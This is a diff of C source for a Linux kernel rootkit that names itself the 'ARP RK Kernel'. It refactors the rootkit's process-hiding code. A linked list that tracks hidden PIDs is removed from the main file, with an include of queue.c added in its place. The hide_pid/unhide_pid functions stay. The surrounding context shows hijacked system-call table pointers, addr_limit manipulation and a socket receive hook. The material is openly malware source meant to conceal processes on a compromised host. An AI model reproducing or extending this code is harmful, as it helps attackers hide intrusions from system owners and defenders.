@@ -46,37 +46,28 @@ LABEL(kernel_start)
 #include <asm/mman.h>
 
 #include "kernel.h"
-#include "hooks.h"
 
 #define LOG_LINE_MAX PAGE_SIZE
 
 /*
  * Types
  */
-struct pid_list_node {
-    pid_t nr;
-    struct task_struct *task;
-    struct pid_list_node *next;
-};
 
 /*
  * Function declarations.
  */
-int hide_pid(pid_t pid);
-int unhide_pid(pid_t pid);
 int pinfo(const char *fmt, ...);
 int perr(const char *fmt, ...);
 int vpfd(int fd, const char *fmt, va_list args);
-void pid_list_create(void);
-void pid_list_destroy(void);
-void pid_list_push(pid_t nr);
-pid_t pid_list_pop(pid_t nr);
-struct pid_list_node *pid_list_find(pid_t nr);
 //void *readfile(const char *file, size_t *len);
 struct task_struct *get_current_task(void);
 mm_segment_t my_get_fs(void);
 void my_set_fs(mm_segment_t seg);
 unsigned int get_kernel_tree(void);
+
+// linked-list
+int hide_pid(pid_t pid);
+int unhide_pid(pid_t pid);
 
 /*
  * Global variables.
@@ -90,13 +81,12 @@ void **ia32_sys_call_table = NULL;
 unsigned int *psct_fastpath = NULL;
 unsigned int *psct_slowpath = NULL;
 unsigned int *pia32sct = NULL;
-struct pid_list_node *pid_list_head = NULL;
-struct pid_list_node *pid_list_tail = NULL;
 unsigned int kernel_tree = 0;
 mm_segment_t *addr_limit = 0;
 long *sct_refs = NULL, *ia32sct_refs = NULL;
 size_t nsct_refs = 0, nia32sct_refs = 0;
 
+// function variables
 int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags) = NULL;
 void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
 void (*f_kfree)(const void *) = NULL;
@@ -120,36 +110,8 @@ unsigned int (*f_skb_seq_read)(unsigned int consumed, const u8 **data,
 void (*f_skb_abort_seq_read)(struct skb_seq_state *st) = NULL;
 
 /*
- * RootKit's functions.
+ * RootKit's functions definitions.
  */
-void pid_list_test(void) {
-	size_t i;
-
-    /*
-	 * Testing pid_list
-	 */
-	pid_list_create();
-
-	for (i = 1; i < 100; i++) {
-		hide_pid(i);
-		unhide_pid(i);
-	}
-
-	for(i = 1; i < 100; i++) {
-		hide_pid(i);
-	}
-
-	for (i = 1; i < 100; i++) {
-		unhide_pid(i);
-	}
-
-	for (i = 1; i < 100; i++) {
-		hide_pid(i);
-	}
-
-	pid_list_destroy();
-}
-
 void kernel_test(void) {
 	pinfo("Hello from ARP RK Kernel!\n");
 	pinfo("This is the test function.\n\n");
@@ -190,73 +152,6 @@ int unhide_pid(pid_t nr) {
 	}
 	
 	return -1;
-}
-
-void pid_list_push(pid_t nr) {
-	struct pid_list_node *node;
-
-	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
-	if (node) {
-		pid_list_tail->next = node;
-		pid_list_tail = node;
-		node->next = NULL;
-		node->nr = nr;
-	} else {
-		perr("f_kmalloc() error at line %d, file %s.\n", __LINE__, __FILE__);
-	}
-}
-
-struct pid_list_node *pid_list_find(pid_t nr) {
-	struct pid_list_node *node;
-
-	node = pid_list_head;
-	while(node) {
-        if (node->nr == nr) {
-			return node;
-		}
-		node = node->next;
-	}
-
-	return NULL;
-}
-
-pid_t pid_list_pop(pid_t nr) {
-	struct pid_list_node *node, *prev;
-
-	prev = node = pid_list_head;
-	while(node) {
-		if (node->nr == nr) {
-			prev->next = node->next;
-			if (pid_list_tail == node) {
-				pid_list_tail = prev;
-			}
-			f_kfree(node);
-
-			return nr;
-		}
-		prev = node;
-		node = node->next;
-	}
-
-	return -1;
-}
-
-void pid_list_create() {
-	struct pid_list_node *node;
-
-	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
-	node->next = NULL;
-	node->nr = 0;
-
-	pid_list_head = pid_list_tail = node;
-}
-
-void pid_list_destroy() {
-	while(pid_list_head->next) {
-		unhide_pid(pid_list_tail->nr);
-	}
-
-	f_kfree(pid_list_head);
 }
 
 /*
@@ -400,6 +295,7 @@ inline void my_set_fs(mm_segment_t seg) {
  * Hook handlers.
  */
 #include "hooks.c"
+#include "queue.c"
 
 LABEL(kernel_end)
 /*
